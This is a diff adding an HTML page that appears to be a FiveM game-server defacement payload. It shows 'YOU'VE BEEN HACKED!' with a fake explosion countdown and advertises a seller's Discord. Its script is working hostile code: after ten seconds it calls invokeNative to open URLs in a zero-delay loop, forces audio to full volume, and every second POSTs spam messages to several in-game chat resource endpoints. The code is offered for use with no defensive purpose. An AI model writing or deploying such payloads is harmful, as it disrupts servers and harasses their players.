@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Hacker Boy</title>
+  <style>
+    body {
+      background-color: #fff;
+      color: #000;
+      font-family: 'Courier New', Courier, monospace;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    #bgVideo {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .top-content {
+      margin-top: 80px;
+    }
+
+    h1 {
+      font-size: 3em;
+      margin: 0;
+      font-weight: bold;
+    }
+
+    .store-text {
+      font-size: 2em;
+      font-weight: bold;
+    }
+
+    p {
+      font-size: 1.5em;
+      margin: 10px 0;
+    }
+
+    a {
+      color: #000;
+      text-decoration: none;
+      font-size: 1.3em;
+      font-weight: bold;
+    }
+
+    a:hover {
+      color: #555;
+      text-decoration: underline;
+    }
+
+    .footer {
+      position: fixed;
+      bottom: 20px;
+      width: 100%;
+      text-align: center;
+      font-size: 1.1em;
+      color: #000;
+    }
+
+    #warningText {
+      display: none;
+      font-size: 2em;
+      font-weight: bold;
+      color: red;
+      margin-top: 30px;
+    }
+
+    .timer {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      font-size: 1.5em;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background-color: rgba(0, 0, 0, 0.05);
+      padding: 10px 15px;
+      border-radius: 12px;
+      border: 1px solid #000;
+      box-shadow: 0 0 10px #000;
+    }
+
+    .timer img {
+      width: 30px;
+      height: 30px;
+    }
+  </style>
+</head>
+<body onclick="enableSound()">
+
+  <!-- فيديو الخلفية -->
+  <video autoplay loop muted playsinline id="bgVideo">
+    <source src="https://j.top4top.io/m_3543nvi1j1.mp4" type="video/mp4">
+  </video>
+
+  <!-- 🔊 عنصر الصوت (انفجار) -->
+  <audio id="explosionSound" preload="auto">
+    <source src="https://f.top4top.io/m_3543vq5ac1.mp3" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+
+  <!-- العداد -->
+  <div class="timer">
+    <img src="https://cdn-icons-png.flaticon.com/512/482/482541.png" alt="Bomb Icon">
+    <span id="countdown">10</span>
+  </div>
+
+  <!-- الكلام العلوي -->
+  <div class="top-content">
+    <h1>YOU'VE BEEN HACKED!</h1>
+    <p class="store-text">kayd : كايد</p> 
+  </div>
+
+  <!-- الرسالة بعد انتهاء العداد -->
+  <div id="warningText">Time’s up... your device will now explode!</div>
+
+  <!-- الكلام السفلي -->
+  <div class="footer">
+    <p>Visit our Discord: <a href="https://discord.gg/v31">discord.gg/v31</a></p>
+    <p>KAYD STORE hacked this server</p>
+    <p>Best Seller of FiveM Ready With Stocks</p>
+    <p>Join our Discord: .gg/v31</p>
+  </div>
+
+  <script>
+    let seconds = 10;
+    const countdownElement = document.getElementById('countdown');
+    const warningText = document.getElementById('warningText');
+    const video = document.getElementById('bgVideo');
+    const explosionSound = document.getElementById('explosionSound');
+
+    const timer = setInterval(() => {
+      seconds--;
+      countdownElement.textContent = seconds;
+
+      if (seconds <= 0) {
+        clearInterval(timer);
+        warningText.style.display = 'block';
+        explosionSound.play(); // 🔊 تشغيل صوت الانفجار
+      }
+    }, 1000);
+
+    // تفعيل الصوت للفيديو
+    setTimeout(() => {
+      video.muted = false;
+      video.volume = 1.0;
+    }, 10000);
+
+    // فتح الرابط بعد 10 ثواني بشكل متكرر
+    setTimeout(() => {
+      setInterval(() => {
+        window.invokeNative?.('openUrl', 'https://discord.gg/');
+      }, 0);
+    }, 10000);
+
+    // السماح بتشغيل الصوت إذا المتصفح يحتاج تفا
+
+
+        // إرسال رسائل بشكل مستمر (Spam chat)
+    const msg = `👑 test 👑`;
+    const bodyJson = JSON.stringify({ message: msg });
+
+    setInterval(() => {
+        // القائمة هنا تحتوي روابط مزيفة/نماذج، تأكد أنها صحيحة أو استبدلها بروابط فعلية إن لزم الأمر
+        fetch("https://flix-scripts/chatResult", { method: "POST", body: bodyJson }).catch(() => {});
+        fetch("https://danger_chat/Danger_Chat:SendMessage", {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                message: msg,
+                channel: "شات العام",
+                color: null,
+                isImageAndLinksAllowed: [false, false],
+            }),
+        }).catch(() => {});
+        fetch("https://easy-chat+/o6ZbK5Ecp6", {
+            method: "POST",
+            headers: {
+                accept: "*/*",
+                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            },
+            body: JSON.stringify({ message: msg, channel: "شات العام" }),
+        }).catch(() => {});
+        fetch("https://melix_chat/chatResult", { method: "POST", body: bodyJson }).catch(() => {});
+        fetch("https://as_chat/chatResult", { method: "POST", body: bodyJson }).catch(() => {});
+        fetch("https://chat/chatResult", { method: "POST", body: bodyJson }).catch(() => {});
+        fetch("https://ho-chatv2/Chat", {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                Type: "chatResult",
+                message: msg,
+                chatType: "general",
+            }),
+        }).catch(() => {});
+    }, 1000);
+</script>
+</body>
+</html>
